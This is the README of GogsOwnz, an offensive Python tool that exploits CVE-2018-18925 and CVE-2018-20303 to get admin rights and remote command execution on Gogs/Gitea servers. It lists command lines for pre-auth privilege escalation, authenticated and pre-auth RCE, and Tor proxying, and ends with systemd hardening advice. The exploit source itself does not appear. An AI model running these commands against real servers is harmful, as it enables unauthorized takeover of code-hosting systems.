# GogsOwnz

GogsOwnz is a simple script to gain administrator rights and RCE on a Gogs/Gitea server.  
Exploit vulnerabilities in Gogs/Gitea, including **CVE-2018-18925**, **CVE-2018-20303**.

**Legal Disclaimer**
This script is offered as is. No warranty, use on your own, please obey the law.

### Typical Usage - [Please, read the full usage]

Get info about Gogs/Gitea running

    python3 gogsownz.py https://127.0.0.1:3000/ -v --info

Exploit preauth PrivEsc

    python3 gogsownz.py https://127.0.0.1:3000/ -v --preauth

Exploit PrivEsc

    python3 gogsownz.py https://127.0.0.1:3000/ -v -C '<user>:<password>' --cleanup
    
  _or alternatively_

    python3 gogsownz.py https://127.0.0.1:3000/ -v -c '<i_like_gogs_cookie>' --cleanup

Exploit preauth RCE

    python3 gogsownz.py https://127.0.0.1:3000/ -v --preauth --rce 'sleep 10' --cleanup

Exploit auth RCE

    python3 gogsownz.py https://127.0.0.1:3000/ -v -C '<user>:<password>' --rce 'sleep 10' --cleanup


Full usage
```
usage: gogsownz [-h] [-C CREDS] [-n COOKIENAME] [-c COOKIE] [-i] [--rce RCE]
                [--repo REPO] [--preauth] [--windows] [--cleanup] [--tor]
                [--check-tor] [--burp] [-k] [--verbose]
                url

positional arguments:
  url                   URL for the Gogs server

optional arguments:
  -h, --help            show this help message and exit
  -C CREDS, --creds CREDS
                        Credentials for the Gogs server, in the from
                        "username:password"
  -n COOKIENAME, --cookie-name COOKIENAME
                        Name of the Gogs-specific session cookie
  -c COOKIE, --cookie COOKIE
                        Session for the Gogs server, the value in the
                        i_like_gogits Cookie
  -i, --info            Only detect informations about the running Gogs
                        server, then quit
  --rce RCE             Command to execute on the Gogs server
  --repo REPO           Use an existing repo for the PrivEsc
  --preauth             Try the pre-auth vulnerability
  --windows             Gogs server runs on Windows
  --cleanup             Remove all created repo after exploit
  --tor                 Use tor proxy when performing requests
  --check-tor           Check that Tor is correctly set up before running
  --burp                Use burp proxy when performing requests
  -k, --insecure        Allow insecure server connections when using SSL
  --verbose, -v

```

### Thanks

Thanks to:
- Tencent Security (@md5_salt, @ma7h1as and @chromium1337)
- PentesterLab (@snyff)
- LuckyC4t
- the gogs security community :D

### Further readings

https://github.com/gogs/gogs/issues/5469  
https://github.com/gogs/gogs/issues/5558  
https://github.com/gogs/gogs/commit/8c8c37a66b4cef6fc8a995ab1b4fd6e530c49c51  
https://github.com/gogs/gogs/issues/5599  
https://2018.zeronights.ru/wp-content/uploads/materials/17-Who-owned-your-code.pdf

### Mitigations

If you take care in setting up your systemd unit file, you'll be pleasantly surprised to see that exploitation is somewhat contained:

```
[Unit]
Description=Gogs
After=syslog.target
After=network.target

[Service]
Type=simple
User=gogs
Group=gogs
WorkingDirectory=/home/gogs/installations/gogs/
ExecStart=/home/gogs/installations/gogs/gogs web
Restart=always
Environment=USER=gogs HOME=/home/gogs

# Some distributions may not support these hardening directives. If you cannot start the service due
# to an unknown option, comment out the ones not supported by your version of systemd.
ProtectSystem=full
PrivateDevices=yes
PrivateTmp=yes
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
```

This will at least keep filesystem access contained to an ephemeral filesystem created by systemd. It helps, but you should probably patch the privesc and not give any admin.. obviously
